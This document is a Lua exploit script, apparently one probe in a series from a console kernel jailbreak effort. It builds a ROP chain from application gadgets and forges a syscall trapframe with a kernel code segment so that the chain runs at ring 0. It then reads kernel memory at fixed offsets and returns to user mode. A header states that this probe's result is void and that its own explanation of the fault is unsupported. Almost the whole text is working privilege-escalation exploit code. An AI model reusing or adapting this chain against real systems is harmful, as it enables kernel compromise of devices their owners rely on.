-- CRASH_CLASS: RISKY -- ring-0 chain, but the return is made pointer-safe
-- PROBE 1367b  ** RESULT IS VOID -- see 1367d **
--
-- The registers this probe set immediately before its own iretq (rax=rsi=rdi=P, a
-- self-referential page) do not appear in the dump at all: mc_rax=0x1A1 (417) and
-- mc_rdi=the frame buffer are the values 417 was entered with. 1367d confirmed with a
-- 0x10000 landmark RIP that a frame carrying CS=0x08 is never installed -- 417 faults
-- inside the kernel. The "structural failure in libkernel's return" reading below is
-- therefore unsupported; the fault is in the kernel's own 417 path.
--
-- PROBE 1367b: ring-0 read of two kernel qwords, then a return that cannot null-deref
--
-- 1366a proved the ring-0 chain runs (417 + CS=0x08 -> pop rsp -> user ROP stack ->
-- mov rax,[supervisor]; mov [user],rax -> iretq back to CPL3, SMEP and SMAP both
-- off). It then died with SIGBUS, si_addr 0x16, at the RIP it resumed on inside
-- libkernel's post-`syscall` stub. The kernel disassembly of its own return path
-- explains why nothing else was wrong:
--
--   docs/dumps_13.60/kernel_text.bin base+0x257B28:
--     test byte ptr [rsp+0xF0], 3      ; tf_cs & 3
--     je   +4                          ; RPL 0 -> SKIP cli and swapgs
--     cli
--     swapgs
--     add rsp, 0xE8
--     iretq
--
-- With CS=0x08 the kernel skips swapgs, so our chain runs with GS = the kernel
-- per-CPU base, and our own iretq puts userland back with GS still = kernel base.
-- The GPRs it loads from the trapframe (rsi, rdx, rcx, r8-r15) are live values; the
-- ones we clobbered are rax, rsi, rdi and rsp, and 1366a left rax = 0 because its
-- second read returned 0.
--
-- So this run separates the two candidate causes: before returning it sets
-- rax = rsi = rdi = P, where P is a page whose every qword equals P. Any pointer
-- walk the resumed stub performs then terminates in a valid writable page instead
-- of address 0x16. If the loader survives, OUT1/OUT2 print and this becomes a
-- repeatable kernel read; if it dies at a kernel-base address instead of 0x16,
-- the fault is the GS swapgs we skipped, and the next run borrows the kernel's own
-- `swapgs` at base+0x257B33.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1366a_ring0_kernel_read_20261109_115002.txt
--   results/phase35_dead_end_reruns/1365a_chain_gadget_validate_20261109_114725.txt
--   results/phase35_dead_end_reruns/1364a_eboot_gadgets_range_20261109_114214.txt
--   results/phase35_dead_end_reruns/1359a_sys417_frame_ride_20261109_113019.txt

if _G.__p1367b_ran then
    print("[!] RE-ENTRY")
    print("=== PROBE 1367b RE-ENTRY ===")
    return
end
_G.__p1367b_ran = true

print("=== PROBE 1367b: RING-0 READ + SAFE RETURN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_wd(addr, val)
    return (pcall(function() memory.write_dword(addr, val) end))
end
local function rdq(addr)
    local ok, v = pcall(function() return memory.read_qword(addr) end)
    if not ok or v == nil then return nil end
    return to_num(v)
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return to_num(v) end
    return nil
end
local function wrq(addr, val)
    pcall(function() memory.write_qword(addr, val) end)
end
local function u64v(v) return uint64(string.format("0x%X", v)) end
local function U(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end

local KBASE_HI = 0xFFFFFFFF
local KBASE_LO = 0xC1000000

local sc593 = make_syscall(593)
local sc421 = make_syscall(421)
local sc417 = make_syscall(417)
local sc20 = make_syscall(20)

print(string.format("[0] pid=%d", to_num(sc20(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local EBN = to_num(eb_lo) + to_num(eb_hi) * 4294967296
print(string.format("[0] eboot base=0x%X  reads: K1=0x%X%08X K2=0x%X%08X",
    EBN, KBASE_HI, KBASE_LO, KBASE_HI, KBASE_LO + 0x257B33))

-- P: a page whose every qword points at itself, so any walk from rax/rsi/rdi stays valid
local P = memory.alloc(0x1000)
local PA = to_num(P)
for off = 0, 0xFF8, 8 do wrq(P + off, u64v(PA)) end

local S = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(S + off, 0) end
local SA = to_num(S)
local OUT1 = SA + 0x1A0
local OUT2 = SA + 0x1A8
local FP   = SA + 0x100

local G_POPSI  = EBN + 0xD77D
local G_MOVRD  = EBN + 0x1A5CC4
local G_POPRDI = EBN + 0xC9DFE
local G_MOVWR  = EBN + 0x92C67
local G_POPRAX = EBN + 0x992
local G_POPRSP = EBN + 0x9A2
local G_IRET   = EBN + 0x11F41

local i = 0
local function put(g, v) wrq(S + i, u64v(g)); wrq(S + i + 8, v); i = i + 0x10 end
put(G_POPSI,  U(KBASE_HI, KBASE_LO))
put(G_MOVRD,  nil)                         -- rax = [K1]
put(G_POPRDI, u64v(OUT1))
put(G_MOVWR,  nil)                         -- [OUT1] = rax
put(G_POPSI,  U(KBASE_HI, KBASE_LO + 0x257B33))
put(G_MOVRD,  nil)                         -- rax = [K2]
put(G_POPRDI, u64v(OUT2))
put(G_MOVWR,  nil)                         -- [OUT2] = rax
put(G_POPRAX, u64v(PA))                    -- rax = P
put(G_POPSI,  u64v(PA))                    -- rsi = P
put(G_POPRDI, u64v(PA))                    -- rdi = P
put(G_POPRSP, u64v(FP))
print(string.format("[1] chain bytes=%d  P=0x%X  chain=0x%X  FP=0x%X", i, PA, SA, FP))

local F = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(F + off, 0) end
local ok421 = pcall(function() return sc421(uint64(F)) end)
if not ok421 then print("=== PROBE 1367b ABORT (421) ===") return end
local orig_rip    = rdq(F + 0xE0) or 0
local orig_cs     = rdq(F + 0xE8) or 0
local orig_rflags = rdq(F + 0xF0) or 0
local orig_rsp    = rdq(F + 0xF8) or 0
print(string.format("[1] live RIP=0x%X CS=0x%X RFLAGS=0x%X RSP=0x%X",
    orig_rip, orig_cs, orig_rflags, orig_rsp))
if orig_cs ~= 0x43 then print("=== PROBE 1367b: unexpected CS, ABORT ===") return end

wrq(FP + 0x00, u64v(G_IRET))
wrq(FP + 0x08, u64v(orig_rip))
wrq(FP + 0x10, u64v(0x43))
wrq(FP + 0x18, u64v(orig_rflags))
wrq(FP + 0x20, u64v(orig_rsp))
wrq(FP + 0x28, u64v(0x3B))

wrq(F + 0xE0, u64v(G_POPRSP))
wrq(F + 0xE8, u64v(0x08))
wrq(F + 0xF8, u64v(SA))

print("[2] installing frame (rax/rsi/rdi=P, chain returns to the live RIP) ...")
local ok417, rv417 = pcall(function() return sc417(u64v(to_num(F))) end)
if ok417 then
    print(string.format("[2] 417 returned %s", tostring(to_num(rv417))))
else
    print("[2] 417 EXC")
end
print("")
print(string.format("[3] OUT1 (kbase+0)        = 0x%X", rdq(S + 0x1A0) or 0))
print(string.format("[3] OUT2 (kbase+0x257B33) = 0x%X", rdq(S + 0x1A8) or 0))
print(string.format("[3] alive pid=%d", to_num(sc20(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))
print("=== PROBE 1367b COMPLETE ===")
